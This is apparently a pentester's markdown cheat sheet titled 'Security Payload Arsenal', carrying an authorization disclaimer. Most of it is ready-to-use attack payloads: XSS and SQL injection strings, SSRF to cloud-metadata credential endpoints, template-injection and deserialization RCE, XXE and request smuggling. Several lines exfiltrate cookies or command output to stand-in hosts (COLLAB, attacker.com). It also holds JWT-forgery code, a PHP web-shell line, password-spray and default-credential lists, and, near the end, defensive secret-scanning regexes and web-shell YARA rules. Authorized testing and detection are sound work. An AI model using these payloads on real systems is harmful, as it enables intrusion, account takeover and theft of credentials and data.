# Security Payload Arsenal

Complete reference library. Organized by vulnerability class. For authorized testing only.

> **Authorization required.** Only use against systems you own or have explicit written permission to test.

---

## XSS Payloads

### Basic
```html
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe srcdoc="<script>alert(1)</script>">
<details open ontoggle=alert(1)>
<input autofocus onfocus=alert(1)>
<video src=1 onerror=alert(1)>
<audio src=1 onerror=alert(1)>
```

### WAF Bypass
```html
<ScRiPt>alert(1)</ScRiPt>
<img src=x oNeRrOr=alert(1)>
<svg/onload=alert(1)>
<math><mtext></p><img src=1 onerror=alert(1)>
<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;(1)">
<img src=x onerror=eval(atob('YWxlcnQoMSk='))>
<script>eval('\x61\x6c\x65\x72\x74\x281\x29')</script>
<script>alert`1`</script>
%3Cscript%3Ealert(1)%3C/script%3E
\u003cscript\u003ealert(1)\u003c/script\u003e
```

### Context Escapes
```html
<!-- Attribute -->
" onmouseover="alert(1)
' onmouseover='alert(1)
" onfocus="alert(1)" autofocus="

<!-- JS string -->
';alert(1)//
\';alert(1)//
</script><script>alert(1)</script>

<!-- URL -->
javascript:alert(1)
JaVaScRiPt:alert(1)
javascript&#x3A;alert(1)
data:text/html,<script>alert(1)</script>
```

### DOM-Based
```javascript
#<img src=x onerror=alert(1)>
#javascript:alert(1)
#';alert(1)//
?__proto__[innerHTML]=<img src=1 onerror=alert(1)>
```

### Data Exfiltration
```javascript
<script>fetch('https://COLLAB/?c='+document.cookie)</script>
<img src=x onerror="this.src='https://COLLAB/?c='+document.cookie">
<script>new Image().src='https://COLLAB/?'+document.cookie</script>
```

---

## SQL Injection

### Detection
```
'
"
`
')
"))
' OR '1'='1
' OR 1=1--
' OR 1=1#
" OR "1"="1
; SELECT SLEEP(5)--
' AND 1=1-- (true)
' AND 1=2-- (false)
```

### Auth Bypass
```
' OR '1'='1
' OR '1'='1'--
') OR ('1'='1
admin' --
admin' #
' OR 'x'='x'--
```

### Union-Based (MySQL)
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT 1,user(),version()--
' UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT 1,2,group_concat(username,':',password) FROM users--
```

### Blind Boolean
```sql
' AND SUBSTRING(database(),1,1)='a'--
' AND (SELECT COUNT(*) FROM users)>0--
```

### Time-Based
```sql
' AND SLEEP(5)--                    (MySQL)
'; SELECT pg_sleep(5)--             (PostgreSQL)
'; WAITFOR DELAY '0:0:5'--          (MSSQL)
1 AND 1=1 AND SLEEP(5)              (no quotes)
```

### Error-Based (MySQL)
```sql
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--
' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT((SELECT database()),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```

### WAF Bypass
```sql
' /*!UNION*/ /*!SELECT*/ NULL--
'UNION%23comment%0ASELECT--
' UNION%0ASELECT--
' UNION(SELECT 1,user(),3)--
```

---

## NoSQL Injection (MongoDB)

### JSON Body
```json
{"username": {"$gt": ""}, "password": {"$gt": ""}}
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": {"$exists": true}, "password": {"$exists": true}}
{"$where": "this.username == 'admin'"}
{"username": {"$regex": "^admin"}}
```

### URL Params
```
?username[$gt]=&password[$gt]=
?username[$ne]=invalid&password[$ne]=invalid
?username[$regex]=^admin&password[$gt]=
```

---

## SSRF Payloads

### Cloud Metadata
```
http://169.254.169.254/latest/meta-data/                         (AWS)
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.170.2/v2/credentials/                            (AWS ECS)
http://metadata.google.internal/computeMetadata/v1/             (GCP)
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
http://100.100.100.200/latest/meta-data/                        (Alibaba)
http://169.254.169.254/metadata/v1/                             (DigitalOcean)
http://169.254.169.254/metadata/instance?api-version=2021-02-01 (Azure)
```

### Internal Services
```
http://127.0.0.1:22/     (SSH)
http://127.0.0.1:3306/   (MySQL)
http://127.0.0.1:6379/   (Redis)
http://127.0.0.1:11211/  (Memcached)
http://127.0.0.1:8080/   (App server)
http://127.0.0.1:9200/   (Elasticsearch)
http://127.0.0.1:27017/  (MongoDB)
```

### IP Bypass
```
http://2130706433/         (decimal)
http://0x7f000001/         (hex)
http://0177.0.0.1/         (octal)
http://127.1/              (short)
http://[::1]/              (IPv6)
http://[::ffff:127.0.0.1]/
http://①②⑦.⓪.⓪.①/
```

### Protocol Bypass
```
file:///etc/passwd
dict://127.0.0.1:6379/info
gopher://127.0.0.1:6379/_INFO%0d%0a
ftp://127.0.0.1/
```

---

## SSTI (Server-Side Template Injection)

### Detection (all engines)
```
{{7*7}}          → 49 (Jinja2, Twig)
${7*7}           → 49 (FreeMarker)
<%= 7*7 %>       → 49 (ERB/Ruby)
#{7*7}           → 49 (Kotlin, Groovy)
*{7*7}           → 49 (Thymeleaf)
{{7*'7'}}        → 7777777 (Twig) vs 49 (Jinja2)
${{<%[%'"}}%\.   (polyglot detection)
```

### Jinja2 RCE
```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}
```

### FreeMarker RCE
```
<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
```

### Twig
```
{{["id"]|map("system")|join}}
```

---

## XXE (XML External Entity)

### Basic
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>
```

### SSRF via XXE
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<root>&xxe;</root>
```

### Blind XXE (OOB)
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://COLLAB/evil.dtd"> %xxe;]>
<root>test</root>
```

evil.dtd:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://COLLAB/?f=%file;'>">
%eval; %exfil;
```

### SVG XXE
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

---

## Command Injection

### Detection
```
; id
| id
|| id
& id
&& id
`id`
$(id)
; sleep 5
| sleep 5
%0aid
%0awhoami
```

### Bypass
```bash
# Space bypass
{cat,/etc/passwd}
cat${IFS}/etc/passwd
cat</etc/passwd

# Quote bypass
c'a't /etc/passwd
c"a"t /etc/passwd

# Blacklist bypass
w'h'o'am'i
/u??/b??/id
/???/???/id
```

---

## Path Traversal

### Basic
```
../../../etc/passwd
..%2f..%2f..%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd
....//....//....//etc/passwd
..%c0%af..%c0%af..%c0%afetc/passwd
```

### Windows
```
..\..\..\windows\win.ini
..%5c..%5c..%5cwindows%5cwin.ini
```

### Null byte (old PHP)
```
../../../etc/passwd%00.jpg
```

---

## Open Redirect

```
//evil.com
///evil.com
https://evil.com
https:evil.com
https://TARGET@evil.com
https://evil.com#TARGET
https://evil.com\.TARGET.com
%2F%2Fevil.com
javascript:window.location='https://evil.com'
```

---

## JWT Attacks

### Algorithm None
```
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.PAYLOAD.
```

### Weak Secret Brute Force
```bash
hashcat -a 0 -m 16500 token.jwt /usr/share/wordlists/rockyou.txt
```
Common secrets: `secret`, `password`, `123456`, `jwt_secret`, `your-256-bit-secret`

### kid Injection
```json
{"kid": "../../dev/null"}
{"kid": "' UNION SELECT 'attacker_secret'--"}
```

### Hasura JWT Forgery (HS512)
```javascript
const crypto = require('crypto');
function base64url(d) { return Buffer.from(d).toString('base64').replace(/\+/g,'-').replace(/\//g,'_').replace(/=/g,''); }
function forgeJWT(secret, role, claims={}) {
  const h = base64url(JSON.stringify({alg:'HS512',typ:'JWT'}));
  const p = base64url(JSON.stringify({
    sub: claims.sub || 'forged',
    iat: Math.floor(Date.now()/1000), exp: Math.floor(Date.now()/1000)+3600,
    'https://hasura.io/jwt/claims': {
      'x-hasura-allowed-roles': [role], 'x-hasura-default-role': role, ...claims.hasura
    }
  }));
  const s = base64url(crypto.createHmac('sha512',secret).update(`${h}.${p}`).digest());
  return `${h}.${p}.${s}`;
}
```

---

## Prototype Pollution

### Detection
```
?__proto__[test]=polluted
?constructor[prototype][test]=polluted
```

### XSS Gadgets
```javascript
Object.prototype.innerHTML = '<img src=x onerror=alert(1)>'
Object.prototype.srcdoc = '<img src=x onerror=alert(1)>'
```

---

## CSRF Bypass

### Origin: null (sandboxed iframe)
```html
<iframe sandbox="allow-scripts allow-forms" srcdoc="
  <form method='POST' action='https://TARGET/'>
    <input name='field' value='payload'>
  </form>
  <script>document.forms[0].submit()</script>
"></iframe>
```

### SameSite=Lax Bypass
```html
<!-- GET requests from cross-site navigations send cookies -->
<script>window.location = 'https://TARGET/action?param=value'</script>
```

### Next.js Server Actions
```bash
curl -s https://TARGET/ | grep -oE '\$ACTION_ID_[a-f0-9]+'
curl -X POST https://TARGET/ -H "Content-Type: multipart/form-data; boundary=----x" -H "Origin: null" \
  --data-binary $'------x\r\nContent-Disposition: form-data; name="$ACTION_ID_HASH"\r\n\r\n\r\n------x--'
```

---

## GraphQL Payloads

### Introspection
```graphql
{ __schema { types { name fields { name type { name } } } } }
```

### Introspection Bypass
```graphql
{ __schema\n{ types { name } } }
{ __schema\t{ types { name } } }
```

### Batching (rate limit / 2FA brute force)
```json
[{"query":"mutation{login(otp:\"0000\")}"},{"query":"mutation{login(otp:\"0001\")}"}]
```

### Alias Batching
```graphql
{ a1: user(id:1){email} a2: user(id:2){email} a3: user(id:3){email} }
```

### IDOR
```graphql
mutation { updateEmail(userId: "VICTIM_ID", email: "attacker@evil.com") { success } }
```

---

## HTTP Request Smuggling

### CL.TE
```http
POST / HTTP/1.1
Host: TARGET
Content-Length: 6
Transfer-Encoding: chunked

0

G
```

### TE.CL
```http
POST / HTTP/1.1
Host: TARGET
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

```

### TE Obfuscation
```
Transfer-Encoding: xchunked
Transfer-Encoding: chunked
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
```

---

## Web Cache Poisoning

### X-Forwarded-Host Injection
```bash
curl -H "X-Forwarded-Host: evil.com" https://TARGET/page
```

### Cache Deception
```
https://TARGET/account/settings.js
https://TARGET/account;.js
https://TARGET/account%3B.js
```

### Unkeyed Header Injection
```
X-Forwarded-For: "><script>alert(1)</script>
X-Original-URL: /admin
```

---

## Race Condition

### Shell (curl parallel)
```bash
seq 20 | xargs -P 20 -I {} curl -s -X POST https://TARGET/redeem \
  -H "Authorization: Bearer $TOKEN" -d 'code=PROMO10' &
wait
```

### TOCTOU Targets
```
POST /api/cart/coupon         (coupon redemption)
POST /api/gift-card/redeem    (gift card)
POST /api/transfer            (fund transfer)
POST /api/vote                (counter)
POST /api/otp/verify          (OTP brute via racing)
```

---

## OIDC Attack Payloads

### Cross-Origin Token Exchange (CORS wildcard)
```javascript
const res = await fetch('https://TARGET/api/v1/oidc/token', {
  method: 'POST',
  headers: {'Content-Type': 'application/x-www-form-urlencoded'},
  body: new URLSearchParams({
    grant_type: 'authorization_code', code: 'STOLEN_CODE',
    client_id: 'app_TARGET', client_secret: 'SECRET',
    redirect_uri: 'https://app.com/callback'
  })
});
```

### Open Redirect in Login
```
https://TARGET/api/auth/login?returnTo=https://evil.com/phish
https://TARGET/api/auth/login?returnTo=//evil.com
```

### Host Header Injection
```bash
curl -H "X-Forwarded-Host: evil.com" -H "X-Forwarded-Proto: https" https://TARGET/api/login-callback
```

---

## Timing Side-Channel

### Detect Unsafe Comparison
```bash
grep -rn "\.digest(" --include="*.ts" --include="*.js" -A 3 | grep "==="
grep -rn "timingSafeEqual" --include="*.ts"
```

### Local Timing Measurement
```javascript
const {performance} = require('perf_hooks');
function measure(fn, a, b, n=500000) {
  for(let i=0;i<10000;i++) fn(a,b);
  const s=performance.now(); for(let i=0;i<n;i++) fn(a,b); return (performance.now()-s)/n;
}
const t='a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2';
console.log('0 match:', measure((a,b)=>a===b, t, '0'.repeat(64)));
console.log('full:', measure((a,b)=>a===b, t, t));
```

---

## CRLF Injection

```
%0d%0aHeader: injected
%0aHeader: injected
%23%0dHeader: injected
```

---

## LDAP Injection

```
*
)(uid=*))(|(uid=*
*))(|(password=*
*))%00
admin)(&)
```

---

## File Upload Bypass

### Extension Bypass
```
.php .php3 .php4 .php5 .phtml .phar .shtml
.asp .aspx .ashx .cer
.jsp .jspx .jspf
file.php.jpg
file.php%00.jpg
```

### Content-Type Bypass
```
Content-Type: image/jpeg (with .php extension)
GIF89a; <?php system($_GET['cmd']); ?>
```

---

## Mass Assignment

### Common Payloads
```json
{"username":"user","email":"u@e.com","isAdmin":true}
{"username":"user","role":"admin"}
{"price":0.01,"discount":100}
{"plan":"enterprise","trial_days":9999}
{"user_id":1,"account_id":VICTIM_ID}
```

### Where to Find
- Registration forms (add `role`, `isAdmin`, `admin`, `is_staff`)
- Profile edit (add `credits`, `balance`, `plan`)
- API PUT/PATCH endpoints — always try adding undocumented fields
- Rails / Django / Laravel / Spring Boot apps

---

## Insecure Deserialization

### Identify Serialized Data
| Type | Hex Header | Base64 Prefix |
|------|------------|---------------|
| Java | `AC ED` | `rO` |
| PHP | `4F 3A` | `Tz` |
| Python Pickle | `80 04 95` | `gASV` |
| Ruby Marshal | `04 08` | `BAgK` |
| .NET BinaryFormatter | `FF 01` | `/w` |

### Exploitation Tools
```bash
# Java — ysoserial
java -jar ysoserial.jar CommonsCollections6 "curl attacker.com/$(id | base64)" | base64
java -jar ysoserial.jar URLDNS http://attacker.com  # detection only

# PHP — phpggc
phpggc Laravel/RCE1 system "id"

# Python pickle RCE
python3 -c "
import pickle, os, base64
class RCE:
    def __reduce__(self): return (os.system, ('curl attacker.com',))
print(base64.b64encode(pickle.dumps(RCE())).decode())
"
```

---

## SAML Attacks

### Signature Stripping
```xml
<!-- Remove <ds:Signature>...</ds:Signature> entirely, set NameID to target user -->
<saml2:NameID>admin</saml2:NameID>
```

### XML Comment Injection (CVE-2017-11427-30)
```xml
<saml2:NameID>user@target.com<!--.evil.com--></saml2:NameID>
<!-- Parser strips comment → authenticates as user@target.com -->
```

### XXE in SAML
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<samlp:Response>...<saml:NameID>&xxe;</saml:NameID></samlp:Response>
```

### XML Signature Wrapping (XSW) Variants
| Variant | Structure |
|---------|-----------|
| XSW1 | Clone unsigned Response appended AFTER existing signature |
| XSW2 | Clone unsigned Response inserted BEFORE existing signature |
| XSW3 | Clone unsigned Assertion inserted BEFORE legitimate signed Assertion |
| XSW4 | Clone unsigned Assertion wrapped INSIDE legitimate Assertion |
| XSW7 | Add `<Extensions>` block containing cloned unsigned Assertion |
| XSW8 | Add `<Object>` block containing original Assertion without its signature |

---

## XS-Leaks (Cross-Site Information Leaks)

### XS-Search (Boolean Oracle)
```javascript
let win = window.open('https://target.com/search?q=GUESS');
setTimeout(() => {
  if (win.length > 0) {
    fetch('https://attacker.com/?hit='+encodeURIComponent('GUESS'));
  }
  win.close();
}, 1000);
```

### Timing Oracle
```javascript
let start = performance.now();
let img = new Image();
img.onload = img.onerror = () => {
  let delta = performance.now() - start;
  fetch('https://attacker.com/?t='+delta);
};
img.src = 'https://target.com/api/profile?id=VICTIM';
```

### Error Oracle (Status Code Leak)
```javascript
let s = document.createElement('script');
s.onerror = () => fetch('https://attacker.com/?status=error');
s.onload = () => fetch('https://attacker.com/?status=success');
s.src = 'https://target.com/api/secret';
document.head.appendChild(s);
```

### Oracle Quick Reference
| Oracle | What It Leaks |
|--------|---------------|
| Frame count (`win.length`) | iframes on page = user state / search results |
| Script `onload`/`onerror` | HTTP status code of cross-origin resource |
| `<img>` `onload`/`onerror` | Resource exists or not |
| Performance API `transferSize` | Response size |
| `response.redirected` (Fetch) | Any redirect happened |
| `history.length` | JS redirects occurred |

---

## MiniKit / WebView Event Spoofing

```javascript
// Fake payment success
MiniKit.trigger('miniapp-payment', { status:'success', transaction_id:'0xFAKE', reference:'ORDER' });

// Fake World ID verification
MiniKit.trigger('miniapp-verify-action', {
  status:'success', proof:'0x'+'00'.repeat(256), merkle_root:'0x'+'00'.repeat(32),
  nullifier_hash:'0x'+'ab'.repeat(32), verification_level:'orb'
});

// Fake wallet auth
MiniKit.trigger('miniapp-wallet-auth', {
  status:'success', message:'FAKE_SIWE', signature:'0x'+'00'.repeat(65),
  address:'0xTARGET', version:2
});
```

---

## Encoding Reference

| Encoding | `<` | `>` | `"` | `'` | `/` |
|----------|-----|-----|-----|-----|-----|
| URL | %3C | %3E | %22 | %27 | %2F |
| Double URL | %253C | %253E | %2522 | %2527 | %252F |
| HTML | &lt; | &gt; | &quot; | &#x27; | &#x2F; |
| Unicode | \u003c | \u003e | \u0022 | \u0027 | \u002f |

---

## Fuzzing — Special Characters (WAF Testing)

```
' " ` ~ ! @ # $ % ^ & * ( ) - + = { } [ ] | \ : ; < > ? , . /
```

---

# WORDLISTS

## Password Lists

### Top 50 Most Common
```
123456 password 123456789 12345678 12345 1234567 qwerty abc123 000000
iloveyou 111111 password1 123123 admin letmein welcome monkey dragon
master sunshine princess passw0rd shadow superman password123 qwerty123
admin123 root toor pass test guest user login changeme default
```

### Default Service Credentials

| Service | Username | Password |
|---------|----------|----------|
| WordPress/Joomla | admin | admin |
| Tomcat | tomcat | tomcat |
| Jenkins/Grafana | admin | admin |
| MySQL | root | (empty)/root |
| PostgreSQL | postgres | postgres |
| MSSQL | sa | (empty)/sa |
| Cisco | cisco/admin | cisco/admin |
| Netgear | admin | password |
| Ubiquiti | ubnt | ubnt |

### Password Spray (seasonal)
```
Winter2025! Spring2025! Summer2025! Fall2025!
Password1! Welcome1! Company1! Company@1
January2025! ... December2025!
```

---

## Username Lists

### Universal Defaults
```
admin administrator root user test guest demo superuser sysadmin support operator manager service default
```

### Database
```
root sa postgres oracle mysql dba sysdba mongodb redis
```

### User Enumeration Techniques
```bash
# Response size difference
curl -s -o /dev/null -w "%{http_code} %{size_download}" -X POST https://target.com/login -d "username=admin&password=wrong"

# Forgot password oracle
for user in admin root test; do
  response=$(curl -s -X POST https://target.com/forgot-password -d "email=${user}@target.com")
  echo "$user: ${#response} bytes"
done

# ffuf enumeration
ffuf -u https://target.com/login -X POST -d "username=FUZZ&password=wrong" -w usernames.txt -fs 1234
```

---

# SECRET DETECTION PATTERNS

## API Keys & Tokens

```regex
# AWS Access Key
AKIA[0-9A-Z]{16}

# AWS Secret
(?i)aws.{0,20}['"][0-9a-zA-Z\/+]{40}['"]

# Google API Key
AIza[0-9A-Za-z\-_]{35}

# GitHub PAT
ghp_[0-9a-zA-Z]{36}

# Stripe Secret
sk_live_[0-9a-zA-Z]{24}

# Slack Token
xox[baprs]-([0-9a-zA-Z]{10,48})?

# SendGrid
SG\.[a-zA-Z0-9\-_]{22}\.[a-zA-Z0-9\-_]{43}

# Shopify
shpat_[a-fA-F0-9]{32}

# Generic key=value
(?i)(api[_-]?key|secret[_-]?key|access[_-]?key|auth[_-]?token)\s*[=:]\s*['"]?([a-zA-Z0-9_\-.]{16,})['"]?

# JWT
eyJ[a-zA-Z0-9_\-]+\.eyJ[a-zA-Z0-9_\-]+\.[a-zA-Z0-9_\-]+
```

## Cryptographic Material

```regex
-----BEGIN [A-Z ]*PRIVATE KEY-----
-----BEGIN OPENSSH PRIVATE KEY-----
-----BEGIN CERTIFICATE-----
```

## PII Patterns

```regex
# Visa
4[0-9]{12}(?:[0-9]{3})?

# US SSN
(?!219-09-9999|078-05-1120)(?!666|000|9\d{2})\d{3}-(?!00)\d{2}-(?!0{4})\d{4}

# Email
[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}

# IPv4
\b(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\b
```

## Secret Scanning Commands

```bash
# AWS keys
grep -rE "AKIA[0-9A-Z]{16}" .

# Private keys
grep -rE "-----BEGIN [A-Z ]*PRIVATE KEY-----" .

# All potential secrets
grep -rE "(?i)(password|secret|api_key|token|auth)\s*[=:]\s*['\"][^'\"]{8,}" .

# JWT tokens
grep -rE "eyJ[a-zA-Z0-9_-]+\.eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+" .

# Automated
trufflehog git https://github.com/target/repo --only-verified
gitleaks detect --source . --report-format json
```

---

# WEB SHELL DETECTION

## PHP Signatures
```regex
eval\s*\(\s*(base64_decode|str_rot13|gzinflate|gzuncompress)
\b(system|exec|passthru|shell_exec|proc_open|popen)\s*\(\s*\$_(GET|POST|REQUEST|COOKIE)
eval\s*\(\s*\$_(GET|POST|REQUEST|COOKIE)
assert\s*\(\s*\$_(GET|POST|REQUEST|COOKIE)
```

## YARA Rules
```yara
rule PHP_Webshell_Generic {
    strings:
        $eval_get = /eval\s*\(\s*\$_(GET|POST|REQUEST|COOKIE)/
        $eval_b64 = /eval\s*\(\s*base64_decode\s*\(/
        $system_get = /system\s*\(\s*\$_(GET|POST|REQUEST|COOKIE)/
    condition:
        any of them
}
```

## Detection Commands
```bash
grep -rn "eval(base64_decode" /var/www/html/
grep -rn "system(\$_" /var/www/html/
find /var/www/html -type f -name "*.php" -newer /tmp/ref -ls
grep "POST" /var/log/apache2/access.log | grep "\.php" | grep -v "wp-login\|wp-admin"
```

---

## Polyglots

### XSS/SQLi
```
';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
```

### XXE/SSRF (SVG)
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg"><image xlink:href="&xxe;"/></svg>
```

---

## External References
- [SecLists](https://github.com/danielmiessler/SecLists) — Comprehensive wordlists
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) — 65 payload categories
- [HowToHunt](https://github.com/KathanP19/HowToHunt) — 44 vuln categories, step-by-step
- [HackTricks](https://book.hacktricks.xyz/) — Attack technique bible
- [DefaultCreds](https://github.com/ihebski/DefaultCreds-cheat-sheet) — Default credentials
- [xsinator.com](https://xsinator.com) — XS-Leak automated testing
